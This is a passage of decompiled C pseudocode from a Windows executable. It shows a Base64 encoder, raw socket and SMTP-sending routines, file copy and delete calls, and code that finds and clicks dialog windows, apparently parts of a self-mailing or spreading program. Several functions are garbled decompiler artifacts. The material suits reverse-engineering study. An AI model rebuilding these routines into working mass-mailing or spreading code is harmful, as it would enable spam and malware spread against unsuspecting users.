    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3 = result; // 0x4054dd
    result = a1;
    int32_t v4 = __asm_bound(*(int64_t *)(v3 + 99)); // 0x4054f1
    int32_t v5 = v4 - 2; // 0x4054f4
    *(int16_t *)v5 = 0x6a69;
    int32_t v6; // 0x4054d1
    int64_t v7 = (int64_t)*(int32_t *)(v6 + 110 + 2 * v6); // 0x4054fa
    int64_t v8 = 111 * v7; // 0x4054fa
    if (v8 != 0x6f00000000 * v7 / 0x100000000) {
        // 0x405572
        return result;
    }
    int32_t v9; // 0x4054d1
    if (v9 == 0) {
        int32_t v10 = (int32_t)((0x100000000 * (int64_t)a3 | (int64_t)result) / (int64_t)a2) + 1; // 0x40557c
        // 0x40557e
        return v10 - 1;
    }
    int32_t v11; // bp-16, 0x4054d1
    int32_t v12; // 0x4054d1
    if (v9 < 0) {
        // 0x405582
        v11 = *(int32_t *)v12;
        int32_t * v13 = (int32_t *)result; // 0x405583
        *v13 = *v13 + result;
        char * v14 = (char *)(result - 119); // 0x405585
        *v14 = *v14 + (char)result;
        return result;
    }
    // 0x405509
    if ((llvm_ctpop_i8((char)v9) & 1) != 0) {
        int32_t * v15 = (int32_t *)a3; // 0x40550b
        *v15 = *v15 ^ v12;
        *(int32_t *)(v4 - 38) = v3 - 1;
        *(int32_t *)(v4 - 42) = *(int32_t *)(v12 + 0x39383736) ^ v12;
        *(int32_t *)(v4 - 22) = 0;
        *(int32_t *)(v4 - 26) = 0;
        *(int32_t *)(v4 - 30) = 0;
        *(int32_t *)(v4 - 34) = 0;
        *(int32_t *)(v4 - 6) = a3;
        *(int32_t *)(v4 - 46) = v5;
        return 0;
    }
    int32_t v16 = &v11; // 0x4054e9
    uint32_t v17 = result + 1; // 0x40553b
    char * v18 = (char *)(v16 + 48 + 8 * v16); // 0x40553c
    *v18 = *v18 + (char)(v17 / 256);
    __writefsdword(v17, v5);
    function_4034be();
    int32_t v19 = function_403616(); // 0x40554d
    int32_t * v20 = (int32_t *)((int32_t)v8 - 8); // 0x405552
    *v20 = v19;
    int64_t v21 = 0x100000000 * (int64_t)(v19 >> 31) | (int64_t)v19; // 0x40555e
    int32_t result2 = v21 / 3; // 0x40555e
    result = result2;
    if ((int32_t)(v21 % 3) != 0) {
        // 0x405571
        return result2;
    }
    uint32_t v22 = *v20; // 0x405564
    // 0x40557e
    return (int32_t)((0x100000000 * (int64_t)(v22 / 0x80000000) | (int64_t)v22) / 3) - 1;
}

// Address range: 0x40558a - 0x405746
// Used cryptographic patterns:
//  - B64EncodeTable (8-bit, little endian)
int32_t function_40558a(void) {
    // 0x40558a
    int32_t v1; // 0x40558a
    char * v2 = (char *)(v1 - 9);
    char * v3 = (char *)(v1 - 10);
    char * v4 = (char *)(v1 - 11);
    char * v5 = (char *)(v1 - 12);
    int32_t * v6 = (int32_t *)(v1 - 16);
    int32_t v7 = 0; // 0x40558a
    int32_t v8 = 3 * v7; // 0x40558c
    int32_t v9 = *(int32_t *)(v1 - 8); // 0x405594
    int32_t v10; // 0x40558a
    int32_t v11; // 0x40558a
    char * v12; // 0x40558a
    unsigned char v13; // 0x40558a
    char v14; // 0x40558a
    unsigned char v15; // 0x40558a
    int32_t v16; // 0x4055a0
    char * v17; // 0x4055a0
    unsigned char v18; // 0x4055a0
    char v19; // 0x4055ae
    char v20; // 0x4055b8
    char * v21; // 0x4055c4
    unsigned char v22; // 0x4055c4
    char v23; // 0x4055d9
    char v24; // 0x4055e5
    unsigned char v25; // 0x4055f4
    char v26; // 0x40560c
    char v27; // 0x405621
    char v28; // 0x4056c9
    unsigned char v29; // 0x40565f
    char v30; // 0x405677
    char v31; // 0x40568f
    if (v8 + 3 > v9) {
        // 0x40562c
        v11 = v8 + v10;
        v12 = (char *)v11;
        v13 = *v12;
        v14 = *(char *)((int32_t)(v13 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v2 = v14;
        v15 = *v12;
        if (v8 + 2 > v9) {
            // 0x40569b
            v28 = *(char *)((16 * (int32_t)v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v28;
            *v4 = 61;
            *v5 = 61;
        } else {
            // 0x405636
            v29 = *(char *)(v11 + 1);
            v30 = *(char *)((int32_t)(v29 / 16 | 16 * v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v30;
            v31 = *(char *)((4 * (int32_t)v29 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v4 = v31;
            *v5 = 61;
        }
    } else {
        // 0x40559d
        v16 = v8 + v10;
        v17 = (char *)v16;
        v18 = *v17;
        v19 = *(char *)((int32_t)(v18 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v2 = v19;
        v20 = *v17;
        v21 = (char *)(v16 + 1);
        v22 = *v21;
        v23 = *(char *)((int32_t)(v22 / 16 | 16 * v20 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v3 = v23;
        v24 = *v21;
        v25 = *(char *)(v16 + 2);
        v26 = *(char *)((int32_t)(v25 / 64 | 4 * v24 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v4 = v26;
        v27 = *(char *)((int32_t)(v25 & 63) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *v5 = v27;
    }
    // 0x4056d7
    int32_t v32; // 0x40558a
    *(int32_t *)(v32 - 4) = *(int32_t *)*(int32_t *)(v1 - 4);
    function_4035b2();
    *(int32_t *)(v32 - 8) = *(int32_t *)(v1 - 20);
    function_4035b2();
    int32_t * v33 = (int32_t *)(v32 - 12);
    *v33 = *(int32_t *)(v1 - 24);
    function_4035b2();
    *(int32_t *)(v32 - 16) = *(int32_t *)(v1 - 28);
    function_4035b2();
    int32_t v34 = v32 - 20; // 0x405711
    int32_t * v35 = (int32_t *)v34;
    *v35 = *(int32_t *)(v1 - 32);
    function_4036d6((int32_t)&g117);
    int32_t v36 = *v6 - 1; // 0x405722
    *v6 = v36;
    v7++;
    while (v36 != 0) {
        // 0x40558c
        v8 = 3 * v7;
        v9 = *(int32_t *)(v1 - 8);
        if (v8 + 3 > v9) {
            // 0x40562c
            v11 = v8 + v10;
            v12 = (char *)v11;
            v13 = *v12;
            v14 = *(char *)((int32_t)(v13 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v2 = v14;
            v15 = *v12;
            if (v8 + 2 > v9) {
                // 0x40569b
                v28 = *(char *)((16 * (int32_t)v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v3 = v28;
                *v4 = 61;
                *v5 = 61;
            } else {
                // 0x405636
                v29 = *(char *)(v11 + 1);
                v30 = *(char *)((int32_t)(v29 / 16 | 16 * v15 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v3 = v30;
                v31 = *(char *)((4 * (int32_t)v29 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
                *v4 = v31;
                *v5 = 61;
            }
        } else {
            // 0x40559d
            v16 = v8 + v10;
            v17 = (char *)v16;
            v18 = *v17;
            v19 = *(char *)((int32_t)(v18 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v2 = v19;
            v20 = *v17;
            v21 = (char *)(v16 + 1);
            v22 = *v21;
            v23 = *(char *)((int32_t)(v22 / 16 | 16 * v20 & 48) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v3 = v23;
            v24 = *v21;
            v25 = *(char *)(v16 + 2);
            v26 = *(char *)((int32_t)(v25 / 64 | 4 * v24 & 60) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v4 = v26;
            v27 = *(char *)((int32_t)(v25 & 63) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
            *v5 = v27;
        }
        // 0x4056d7
        *(int32_t *)(v34 - 4) = *(int32_t *)*(int32_t *)(v1 - 4);
        function_4035b2();
        *(int32_t *)(v34 - 8) = *(int32_t *)(v1 - 20);
        function_4035b2();
        v33 = (int32_t *)(v34 - 12);
        *v33 = *(int32_t *)(v1 - 24);
        function_4035b2();
        *(int32_t *)(v34 - 16) = *(int32_t *)(v1 - 28);
        function_4035b2();
        v34 -= 20;
        v35 = (int32_t *)v34;
        *v35 = *(int32_t *)(v1 - 32);
        function_4036d6((int32_t)&g117);
        v36 = *v6 - 1;
        *v6 = v36;
        v7++;
    }
    // 0x40572b
    __writefsdword(0, *v35);
    *v33 = 0x40574d;
    return function_4034e2();
}

// Address range: 0x405746 - 0x40574b
int32_t function_405746(void) {
    // 0x405746
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40574b - 0x40574d
int32_t function_40574b(void) {
    // 0x40574b
    int32_t result; // 0x40574b
    return result;
}

// Address range: 0x40574d - 0x405753
int32_t function_40574d(int32_t a1, int32_t a2) {
    // 0x40574d
    int32_t result; // 0x40574d
    return result;
}

// Address range: 0x405756 - 0x4057af
int32_t function_405756(void) {
    struct hostent * v1 = gethostbyname((char *)function_403816()); // 0x405764
    function_40286e();
    int32_t result; // 0x405756
    if (v1 != NULL) {
        int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x405784
        result = (int32_t)*(char *)v2;
    }
    // 0x4057a1
    return result;
}

// Address range: 0x4057b2 - 0x405856
int32_t function_4057b2(void) {
    // 0x4057b2
    function_403806();
    int32_t v1 = __readfsdword(0); // bp-452, 0x4057d6
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-412, 0x4057b2
    WSAStartup((int16_t)(int32_t)&v2, (struct WSAData *)257);
    int32_t v3 = 2; // bp-472, 0x4057f3
    int32_t sock_fd = socket(AF_UNSPEC, SOCK_STREAM, IPPROTO_IGMP); // 0x4057f5
    int32_t v4 = &v3; // 0x4057ff
    if (sock_fd != -1) {
        int16_t sock = htons((int16_t)function_405756()); // 0x405819
        int32_t v5 = sock_fd; // bp-488, 0x40582e
        int32_t v6 = &v5; // 0x40582e
        int32_t v7 = connect((int32_t)sock, (struct sockaddr *)&g117, (int32_t)&g117); // 0x40582f
        v4 = v6;
        if (v7 == 0) {
            // 0x405838
            int32_t v8; // 0x4057b2
            *(int32_t *)v8 = sock_fd;
            v4 = v6;
        }
    }
    // 0x405840
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x40585d;
    return function_4034be();
}

// Address range: 0x405856 - 0x40585b
int32_t function_405856(void) {
    // 0x405856
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40585b - 0x40585d
int32_t function_40585b(void) {
    // 0x40585b
    int32_t result; // 0x40585b
    return result;
}

// Address range: 0x40585d - 0x405866
int32_t function_40585d(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40585d
    int32_t result; // 0x40585d
    return result;
}

// Address range: 0x405866 - 0x405872
int32_t function_405866(void) {
    // 0x405866
    int32_t v1; // 0x405866
    closesocket(v1);
    return WSACleanup();
}

// Address range: 0x405872 - 0x4058e3
int32_t function_405872(void) {
    // 0x405872
    function_403806();
    int32_t v1 = __readfsdword(0); // bp-4124, 0x405895
    __writefsdword(0, (int32_t)&v1);
    function_403816();
    function_4070c2();
    int32_t sock = function_407096(4); // 0x4058b8
    int32_t buf; // bp-4105, 0x405872
    int32_t length; // 0x405872
    send(sock, (char *)&buf, length, (int32_t)&g117);
    __writefsdword(0, length);
    return function_4034be();
}

// Address range: 0x4058e3 - 0x4058e8
int32_t function_4058e3(void) {
    // 0x4058e3
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4058e8 - 0x4058ea
int32_t function_4058e8(void) {
    // 0x4058e8
    int32_t result; // 0x4058e8
    return result;
}

// Address range: 0x4058ea - 0x4058f1
int32_t function_4058ea(int32_t a1) {
    // 0x4058ea
    int32_t result; // 0x4058ea
    return result;
}

// Address range: 0x4058f2 - 0x40591e
int32_t function_4058f2(void) {
    // 0x4058f2
    int32_t sock; // 0x4058f2
    recv(sock, (char *)&g117, (int32_t)&g117, (int32_t)&g117);
    return function_4070ae();
}

// Address range: 0x40591e - 0x405b93
int32_t function_40591e(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1; // bp-8, 0x40591e
    int32_t v2 = &v1; // 0x405922
    int32_t v3; // 0x40591e
    for (int32_t i = 8; i > 0; i--) {
        // 0x405927
        v3 = v2;
        *(int32_t *)(v3 - 4) = 0;
        v2 = v3 - 8;
        *(int32_t *)v2 = 0;
    }
    // 0x40592e
    *(int32_t *)(v3 - 12) = 0;
    function_403806();
    function_403806();
    function_403806();
    function_403806();
    function_403806();
    function_403806();
    function_403806();
    int32_t v4; // bp-4, 0x40591e
    *(int32_t *)(v3 - 20) = (int32_t)&v4;
    *(int32_t *)(v3 - 24) = 0x405b93;
    int32_t v5 = __readfsdword(0); // 0x40597c
    int32_t v6 = v3 - 28; // 0x40597c
    int32_t * v7 = (int32_t *)v6;
    *v7 = v5;
    __writefsdword(0, v6);
    int32_t * v8 = v7; // 0x405996
    int32_t v9 = v6; // 0x405996
    if (function_4057b2() != 0) {
        // 0x40599c
        *(int32_t *)(v3 - 32) = (int32_t)"HELO ";
        *(int32_t *)(v3 - 40) = (int32_t)"\r\n";
        function_4036d6((int32_t)&g117);
        function_405872();
        function_4058f2();
        function_405872();
        function_4058f2();
        function_40361e();
        function_405872();
        function_4058f2();
        function_40361e();
        function_405872();
        function_4058f2();
        *(int32_t *)(v3 - 44) = (int32_t)"MAIL FROM: <";
        *(int32_t *)(v3 - 48) = a1;
        *(int32_t *)(v3 - 52) = (int32_t)&g2;
        *(int32_t *)(v3 - 56) = (int32_t)"\r\n";
        function_4036d6((int32_t)&g117);
        function_405872();
        function_4058f2();
        *(int32_t *)(v3 - 60) = (int32_t)"RCPT TO: <";
        *(int32_t *)(v3 - 64) = a2;
        *(int32_t *)(v3 - 68) = (int32_t)&g2;
        *(int32_t *)(v3 - 72) = (int32_t)"\r\n";
        function_4036d6((int32_t)&g117);
        function_405872();
        function_4058f2();
        function_405872();
        function_4058f2();
        *(int32_t *)(v3 - 76) = (int32_t)"From: <";
        *(int32_t *)(v3 - 80) = a1;
        *(int32_t *)(v3 - 84) = (int32_t)&g2;
        *(int32_t *)(v3 - 88) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 92) = (int32_t)"To: <";
        *(int32_t *)(v3 - 96) = a2;
        *(int32_t *)(v3 - 100) = (int32_t)&g2;
        *(int32_t *)(v3 - 104) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 108) = (int32_t)"Subject: ";
        *(int32_t *)(v3 - 112) = a3;
        *(int32_t *)(v3 - 116) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 120) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 124) = a4;
        *(int32_t *)(v3 - 128) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 132) = (int32_t)&g3;
        v9 = v3 - 136;
        v8 = (int32_t *)v9;
        *v8 = (int32_t)"\r\n";
        function_4036d6((int32_t)&g117);
        function_405872();
        function_4058f2();
        function_405872();
        function_4058f2();
        function_405866();
    }
    // 0x405b5e
    __writefsdword(0, *v8);
    *(int32_t *)(v9 + 8) = 0x405b9a;
    function_4034e2();
    function_4034e2();
    return function_4034e2();
}

// Address range: 0x405b93 - 0x405b98
int32_t function_405b93(void) {
    // 0x405b93
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x405b98 - 0x405b9a
int32_t function_405b98(void) {
    // 0x405b98
    int32_t result; // 0x405b98
    return result;
}

// Address range: 0x405b9a - 0x405ba3
int32_t function_405b9a(int32_t a1) {
    // 0x405b9a
    int32_t result; // 0x405b9a
    return result;
}

// Address range: 0x405c65 - 0x405cad
int32_t function_405c65(void) {
    // 0x405c65
    int32_t v1; // 0x405c65
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x405c65
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x405c65
    char * v5 = (char *)(v4 + 85); // 0x405c69
    int32_t v6; // 0x405c65
    *v5 = *v5 + (char)v6;
    int32_t v7 = __readfsdword(0); // bp-16, 0x405c7d
    __writefsdword(0, (int32_t)&v7);
    int32_t v8 = g102 + 1; // 0x405c83
    g102 = v8;
    if (v8 == 0) {
        // 0x405c8b
        function_4034be();
        function_4034be();
    }
    // 0x405c9f
    __writefsdword(0, v7);
    return 0;
}

// Address range: 0x405cad - 0x405cb2
int32_t function_405cad(void) {
    // 0x405cad
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x405cb2 - 0x405cb4
int32_t function_405cb2(void) {
    // 0x405cb2
    int32_t result; // 0x405cb2
    return result;
}

// Address range: 0x405cb4 - 0x405cb6
int32_t function_405cb4(int32_t a1) {
    // 0x405cb4
    int32_t result; // 0x405cb4
    return result;
}

// Address range: 0x405cb6 - 0x405cbe
int32_t function_405cb6(void) {
    // 0x405cb6
    g102--;
    int32_t result; // 0x405cb6
    return result;
}

// Address range: 0x405cbe - 0x405dd3
int32_t function_405cbe(void) {
    // 0x405cbe
    int32_t v1; // 0x405cbe
    if (v1 == 0) {
        // 0x405dc8
        int32_t v2; // bp-24, 0x405cbe
        return *(int32_t *)((int32_t)&v2 + 4);
    }
    char * v3 = (char *)function_403816(); // 0x405cdf
    char * lpszWindow = v3; // bp-28, 0x405cdf
    if (!PathFileExistsA(v3)) {
        // 0x405dc8
        return *(int32_t *)((int32_t)&lpszWindow + 4);
    }
    int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"#32770", NULL, lpszWindow); // 0x405d01
    int32_t lParam = (int32_t)hWnd; // 0x405d01
    int32_t v4 = lParam; // bp-48, 0x405d08
    if (!IsWindow(hWnd)) {
        // 0x405dc8
        return *(int32_t *)((int32_t)&v4 + 4);
    }
    int32_t v5 = 66; // bp-56, 0x405d2a
    int32_t * hMem = GlobalAlloc(function_403616() + 22, 66); // 0x405d2c
    if (hMem == NULL) {
        // 0x405dc8
        return *(int32_t *)((int32_t)&v5 + 4);
    }
    int32_t * v6 = GlobalLock(hMem); // 0x405d3c
    char * v7; // bp-64, 0x405cbe
    if (v6 == NULL) {
        // 0x405d47
        v7 = (char *)hMem;
        GlobalFree(hMem);
        // 0x405dc8
        return *(int32_t *)((int32_t)&v7 + 4);
    }
    int32_t v8 = (int32_t)v6; // 0x405d3c
    *v6 = 20;
    *(int32_t *)(v8 + 4) = 0;
    *(int32_t *)(v8 + 8) = 0;
    *(int32_t *)(v8 + 12) = 0;
    *(int32_t *)(v8 + 16) = 0;
    char * lpString1 = (char *)function_403816(); // 0x405d70
    v7 = lpString1;
    lstrcpyA(lpString1, (char *)(v8 + 20));
    GlobalUnlock(hMem);
    PostMessageA(NULL, (int32_t)hMem, 563, lParam);
    int32_t hWnd2 = function_406ff6(0x405dde, 2000, -1); // 0x405da8
    int32_t v9 = hWnd2; // bp-104, 0x405daf
    bool v10 = IsWindow((int32_t *)hWnd2); // 0x405db0
    int32_t v11 = &v9; // 0x405db7
    if (v10) {
        int32_t v12 = hWnd2; // bp-120, 0x405dc2
        SendMessageA(NULL, 0, 245, hWnd2);
        v11 = &v12;
    }
    // 0x405dc8
    return *(int32_t *)(v11 + 4);
}

// Address range: 0x405dd3 - 0x405ece
int32_t function_405dd3(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x405dd3
    uint32_t v1; // 0x405dd3
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405dd3
    *(char *)v2 = *(char *)&v2 + (char)(v1 / 256);
    int32_t v3 = (v1 & 14) > 9 ? v1 + 6 : v1; // 0x405dd9
    bool v4 = (v1 & 14) > 9 | (v3 & 14) > 9; // 0x405dda
    int32_t v5 = (v4 ? v3 + 6 : v3) & 15; // 0x405dda
    int32_t v6 = v5 | v1 & -0x10000 | 256 * ((int32_t)v4 + (int32_t)((v1 & 14) > 9)) + v1 & 0xff00; // 0x405dda
    char * v7 = (char *)v6; // 0x405ddb
    char v8 = v5; // 0x405ddb
    *v7 = *v7 ^ v8;
    int32_t v9; // 0x405dd3
    char * v10 = (char *)(v9 + 0x4e2628f1); // 0x405ddd
    uint32_t v11; // 0x405dd3
    *v10 = *v10 + (char)(v11 / 256);
    int32_t * v12 = (int32_t *)v6; // 0x405de3
    *v12 = *v12 - v6;
    char * v13 = (char *)(v11 + 117); // 0x405de5
    char v14 = *v13 + v8; // 0x405de5
    *v13 = v14;
    if (v14 == 0) {
        int32_t v15 = function_403dde(); // 0x405e63
        v2 = v15;
        int32_t result; // 0x405dd3
        if (v15 < 0) {
            // 0x405e86
            function_403dd6();
            function_403f92();
            function_403dde();
            function_403512();
            result = -1;
        } else {
            // 0x405e6e
            v2 = v15 + 1;
            function_403762();
        }
        // 0x405ec7
        return result;
    }
    // 0x405dea
    int32_t v16; // 0x405dd3
    int32_t v17 = v11 ^ v16; // 0x405dd7
    int16_t v18 = v11; // 0x405dea
    __asm_outsd(v18, *(int32_t *)v17);
    __asm_outsb(v18, *(char *)v17);
    *v7 = *v7 + v8;
    __asm_iretd();
    int32_t v19; // 0x405dd3
    char * v20 = (char *)(v19 - 117); // 0x405df9
    *v20 = *v20 - 69;
    __asm_in(-0x2b45);
    int32_t v21 = __readfsdword(0); // bp-12, 0x405e05
    __writefsdword(0, (int32_t)&v21);
    g103++;
    __writefsdword(0, v21);
    return 0;
}

// Address range: 0x405ece - 0x405f05
int32_t function_405ece(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405ed9
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g104 + 1; // 0x405edf
    g104 = v2;
    if (v2 == 0) {
        // 0x405ee7
        function_403f9e();
    }
    // 0x405ef7
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405f05 - 0x405f0a
int32_t function_405f05(void) {
    // 0x405f05
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x405f0a - 0x405f0c
int32_t function_405f0a(void) {
    // 0x405f0a
    int32_t result; // 0x405f0a
    return result;
}

// Address range: 0x405f0c - 0x405f0e
int32_t function_405f0c(int32_t a1) {
    // 0x405f0c
    int32_t result; // 0x405f0c
    return result;
}

// Address range: 0x405f0e - 0x405f50
int32_t function_405f0e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405f19
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g104; // 0x405f1f
    g104 = v2 - 1;
    if (v2 == 0) {
        // 0x405f28
        function_403f92();
    }
    // 0x405f42
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405f50 - 0x405f55
int32_t function_405f50(void) {
    // 0x405f50
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x405f55 - 0x405f57
int32_t function_405f55(void) {
    // 0x405f55
    int32_t result; // 0x405f55
    return result;
}

// Address range: 0x405f57 - 0x405f59
int32_t function_405f57(int32_t a1) {
    // 0x405f57
    int32_t result; // 0x405f57
    return result;
}

// Address range: 0x405f5a - 0x405f5d
int32_t function_405f5a(int32_t a1) {
    // 0x405f5a
    int32_t result; // 0x405f5a
    return result;
}

// Address range: 0x405f5d - 0x40609d
int32_t function_405f5d(int32_t a1) {
    // 0x405f5d
    int32_t v1; // 0x405f5d
    __asm_out_11(177, v1);
    int32_t v2; // 0x405f5d
    int32_t v3; // 0x405f5d
    unsigned char v4 = *(char *)(v3 + (v2 & 255)); // 0x405f60
    int32_t v5 = v2 & -256; // 0x405f60
    int32_t v6; // 0x405f5d
    float80_t v7; // 0x405f5d
    *(int64_t *)(v6 + 0x2ed5d5e2) = (int64_t)v7;
    char * v8; // bp-20, 0x405f5d
    bool v9; // 0x405f5d
    if (!v9) {
        char * v10 = (char *)(v5 | (int32_t)v4); // 0x405f69
        *v10 = *v10 + 26 * v4;
        v8 = NULL;
        int32_t v11 = __readfsdword(0); // bp-48, 0x405fb6
        __writefsdword(0, (int32_t)&v11);
        return GetClassLongA((int32_t *)-1, (int32_t)&g117);
    }
    // 0x405fd2
    bool v12; // 0x405f5d
    unsigned char v13 = *(char *)((v12 ? -4 : 4) + v2); // 0x405fd2
    char * v14 = (char *)(v5 | (int32_t)v13); // 0x405fd3
    *v14 = *v14 + v13;
    int32_t v15; // 0x405f5d
    char * v16 = (char *)(v15 - 0x397407ab); // 0x405fd5
    *v16 = *v16 + (char)v6;
    function_4070ea();
    int32_t v17 = function_40395a(); // 0x405fe8
    int32_t v18 = function_40395a() - 1; // 0x406001
    int32_t v19; // 0x405f5d
    if (v18 >= 0 && v17 + 2 <= v18) {
        int32_t v20 = v15 - 12; // 0x40600a
        int32_t v21 = v20; // bp-4, 0x40600d
        int32_t * v22 = (int32_t *)v20; // 0x406015
        function_403876(v22);
        v19 = &v21;
        if (*v22 != 0) {
            // 0x406032
            function_406ed2();
            function_4035c2();
            function_40361e();
            DeleteFileA((char *)function_403816());
            char * lpExistingFileName = (char *)function_403816(); // 0x406072
            v8 = lpExistingFileName;
            CopyFileA(lpExistingFileName, (char *)&g117, (bool)&g117);
            function_405cbe();
            v19 = (int32_t)&v8;
        }
    }
    // 0x406082
    __writefsdword(0, *(int32_t *)v19);
    *(int32_t *)(v19 + 8) = 0x4060a4;
    return function_4034e2();
}

// Address range: 0x40609d - 0x4060a2
int32_t function_40609d(void) {
    // 0x40609d
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4060a2 - 0x4060a4
int32_t function_4060a2(void) {
    // 0x4060a2
    int32_t result; // 0x4060a2
    return result;
}

// Address range: 0x4060a4 - 0x4060b0
int32_t function_4060a4(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4060a4
    int32_t v1; // 0x4060a4
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4060b5 - 0x4060bf
int32_t function_4060b5(void) {
    // 0x4060b5
    int32_t v1; // 0x4060b5
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x4060b5
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    return result;
}

// Address range: 0x4060c4 - 0x4060db
int32_t function_4060c4(void) {
    // 0x4060c4
    int32_t v1; // 0x4060c4
    *(char *)v1 = 2 * (char)v1;
    uint32_t v2; // 0x4060c4
    int32_t v3 = (v2 & 0x100000) == 0 ? 0 : 255; // 0x4060ca
    int32_t v4; // 0x4060c4
    char * v5 = (char *)((v1 | (int32_t)__asm_in((int16_t)v4)) & -256 | v3); // 0x4060cb
    unsigned char v6 = *v5; // 0x4060cb
    *v5 = v6 / 128 | 2 * v6;
    uint32_t v7; // 0x4060c4
    *(char *)v4 = *(char *)&v4 + (char)(v7 / 256);
    *(int32_t *)((v2 / 0x100000 | 0x1000 * v2) - 4) = 0x405f9e;
    return EnumWindows((bool (*)(int32_t *, int32_t))&g117, (int32_t)&g117);
}

// Address range: 0x4060ce - 0x4060cf
int32_t function_4060ce(int32_t a1) {
    // 0x4060ce
    int32_t result; // 0x4060ce
    return result;
}

// Address range: 0x4060de - 0x406103
int32_t function_4060de(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4060e9
    __writefsdword(0, (int32_t)&v1);
    g105++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406103 - 0x406108
int32_t function_406103(void) {
    // 0x406103
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x406108 - 0x40610a
int32_t function_406108(void) {
    // 0x406108
    int32_t result; // 0x406108
    return result;
}

// Address range: 0x40610a - 0x40610c
int32_t function_40610a(int32_t a1) {
    // 0x40610a
    int32_t result; // 0x40610a
    return result;
}

// Address range: 0x40610e - 0x406116
int32_t function_40610e(void) {
    // 0x40610e
    g105--;
    int32_t result; // 0x40610e
    return result;
}

// Address range: 0x406116 - 0x40614e
int32_t function_406116(void) {
    // 0x406116
    function_40618a();
    if (g32 == 0) {
        // 0x40614a
        return 0;
    }
    int32_t result = *(int32_t *)0x408154; // 0x406128
    if (*(int32_t *)result == 0) {
        // 0x40614a
        return result;
    }
    // 0x406132
    PostQuitMessage(66);
    function_404522(66);
    // UNREACHABLE
}

// Address range: 0x406151 - 0x406188
int32_t function_406151(void) {
    // 0x406151
    uint32_t v1; // 0x406151
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x406151
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    char * v4 = (char *)(v1 + 114); // 0x406155
    *v4 = *v4 + (char)(v1 / 256);
    int32_t v5 = v2;
    *(char *)v5 = *(char *)&v2 + (char)v5;
    if (g28 != 0) {
        // 0x406163
        function_40618a();
    }
    int32_t v6 = *(int32_t *)0x408148; // 0x40616d
